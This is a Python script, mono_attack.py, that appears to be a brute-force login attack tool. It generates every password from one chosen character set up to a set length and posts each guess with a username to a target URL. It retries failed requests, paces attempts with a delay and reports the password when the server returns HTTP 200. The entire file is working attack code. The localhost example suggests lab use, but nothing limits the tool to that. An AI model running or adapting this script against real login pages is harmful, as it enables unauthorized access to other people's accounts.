#!/usr/bin/env python3
"""
================================================================================
File:        mono_attack.py
Description: Monolithic (single-alphabet) brute-force attack tool
             Generates password candidates from ONE character set at a time
             (digits, lowercase, uppercase, symbols, or custom string)
Parameters:  --target <URL>, --user <username>, --alphabet <type>,
             --custom <string>, --max-len <int>, --delay <float>
Author:      Erik Buser
Date:        2025-10-28
================================================================================
"""

import argparse
import itertools
import sys
import time
import requests
import string


def build_alphabet(kind, custom=None):
    """Build alphabet based on the selected kind.
    
    Args:
        kind: One of 'digits', 'lower', 'upper', 'symbols', 'custom'
        custom: Custom alphabet string (required if kind='custom')
    
    Returns:
        str: The alphabet string to use for password generation
    """
    if kind == "digits":
        return "0123456789"
    if kind == "lower":
        return string.ascii_lowercase
    if kind == "upper":
        return string.ascii_uppercase
    if kind == "symbols":
        return "!@#$%^&*()_+-=[]{}|;:',.<>?/~`"
    if kind == "custom":
        if not custom:
            raise ValueError("--alphabet custom requires --custom value")
        return custom
    raise ValueError(f"unknown alphabet kind: {kind}")


def try_post(url, payload, timeout=5.0, max_retries=3):
    backoff = 0.5
    for attempt in range(1, max_retries + 1):
        try:
            r = requests.post(url, json=payload, timeout=timeout)
            return r
        except requests.RequestException as e:
            if attempt == max_retries:
                # give up and return None
                print(f"[!] Request failed after {attempt} attempts: {e}")
                return None
            else:
                # small backoff then retry
                time.sleep(backoff)
                backoff *= 2
    return None


def main():
    parser = argparse.ArgumentParser(description="Monolithic brute-force POST tool")
    parser.add_argument("--target", required=True, help="Target URL (e.g. http://127.0.0.1:5000/login)")
    parser.add_argument("--user", required=True, help="Username to test")
    parser.add_argument(
        "--alphabet",
        choices=("digits", "lower", "upper", "symbols", "custom"),
        default="digits",
        help="Alphabet to use for password generation",
    )
    parser.add_argument("--custom", help="Custom alphabet string when --alphabet custom is used")
    parser.add_argument("--max-len", type=int, default=4, help="Maximum password length to try")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay in seconds between attempts")
    args = parser.parse_args()

    try:
        alphabet = build_alphabet(args.alphabet, args.custom)
    except ValueError as e:
        print(e, file=sys.stderr)
        return 2

    total = 0
    for L in range(1, args.max_len + 1):
        total += len(alphabet) ** L
    print(f"[+] Alphabet size: {len(alphabet)}; Max length: {args.max_len}; Total candidates: {total}")

    tried = 0
    start = time.time()
    try:
        for length in range(1, args.max_len + 1):
            # product returns tuples; join to string
            for tup in itertools.product(alphabet, repeat=length):
                pwd = "".join(tup)

                payload = {"username": args.user, "password": pwd}
                r = try_post(args.target, payload)
                tried += 1

                if r is None:
                    # request completely failed after retries; skip this candidate
                    print(f"[-] request failed for candidate '{pwd}', skipping")
                else:
                    # Treat HTTP 200 as success
                    if r.status_code == 200:
                        print(f"FOUND: {pwd}")
                        return 0
                    else:
                        # optional: print progress for debugging
                        if tried % 100 == 0:
                            elapsed = time.time() - start
                            print(f"[i] tried {tried} candidates, last='{pwd}', status={r.status_code}, elapsed={elapsed:.1f}s")

                time.sleep(args.delay)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 130

    print("Not found")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
